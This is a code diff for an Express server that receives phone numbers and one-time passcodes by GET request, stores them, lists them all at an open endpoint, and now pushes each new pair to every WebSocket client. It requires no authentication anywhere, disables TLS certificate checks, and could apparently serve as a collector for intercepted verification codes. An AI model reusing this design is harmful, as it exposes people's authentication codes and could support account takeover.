@@ -1,33 +1,34 @@
 const express = require('express');
-const { Pool } = require('pg'); // PostgreSQL client
+const { Pool } = require('pg');
 const path = require('path');
+const { WebSocketServer } = require('ws'); // Import WebSocket library
 
 const app = express();
-
-// PostgreSQL connection configuration
 const pool = new Pool({
-    connectionString: process.env.DATABASE_URL, // Use DATABASE_URL environment variable
-    ssl: {
-        rejectUnauthorized: false, // Required for Railway PostgreSQL setup
-    },
+    connectionString: process.env.DATABASE_URL,
+    ssl: { rejectUnauthorized: false },
 });
 
-// Ensure the 'otps' table exists in the database
-pool.query(
-    `CREATE TABLE IF NOT EXISTS otps (
-        id SERIAL PRIMARY KEY,
-        phone VARCHAR(20) NOT NULL,
-        otp VARCHAR(10) NOT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    );`,
-    (err, res) => {
-        if (err) {
-            console.error('Error creating table:', err);
-        } else {
-            console.log('Table creation successful or already exists.');
+// Array to store connected WebSocket clients
+const clients = [];
+
+// WebSocket server setup
+const wss = new WebSocketServer({ noServer: true });
+wss.on('connection', (ws) => {
+    console.log('New WebSocket connection');
+    clients.push(ws);
+
+    ws.on('close', () => {
+        console.log('WebSocket connection closed');
+        const index = clients.indexOf(ws);
+        if (index > -1) {
+            clients.splice(index, 1);
         }
-    }
-);
+    });
+});
+
+// Serve static HTML from 'public' folder
+app.use(express.static(path.join(__dirname, 'public')));
 
 // Endpoint to receive phone and OTP
 app.get('/', async (req, res) => {
@@ -42,8 +43,12 @@ app.get('/', async (req, res) => {
     }
 
     try {
-        // Insert phone and OTP into the database
+        // Save OTP to the database
         await pool.query('INSERT INTO otps (phone, otp) VALUES ($1, $2)', [phone, otp]);
+
+        // Notify all connected WebSocket clients
+        const message = JSON.stringify({ phone, otp });
+        clients.forEach((ws) => ws.send(message));
 
         res.status(200).json({
             message: `OTP ${otp} received for phone ${phone}`,
@@ -58,10 +63,9 @@ app.get('/', async (req, res) => {
     }
 });
 
-// Endpoint to fetch all OTP data
+// Fetch all OTP data from the database
 app.get('/fetch-otp-data', async (req, res) => {
     try {
-        // Fetch all OTP data from the database
         const result = await pool.query('SELECT phone, otp, created_at FROM otps ORDER BY id DESC');
         res.json(result.rows);
     } catch (error) {
@@ -73,11 +77,14 @@ app.get('/fetch-otp-data', async (req, res) => {
     }
 });
 
-// Serve static HTML from 'public' folder
-app.use(express.static(path.join(__dirname, 'public')));
+// Start the server and attach WebSocket
+const server = app.listen(process.env.PORT || 3000, () => {
+    console.log(`Server running on port ${process.env.PORT || 3000}`);
+});
 
-// Start the server
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// Upgrade HTTP connections to WebSocket
+server.on('upgrade', (req, socket, head) => {
+    wss.handleUpgrade(req, socket, head, (ws) => {
+        wss.emit('connection', ws, req);
+    });
 });
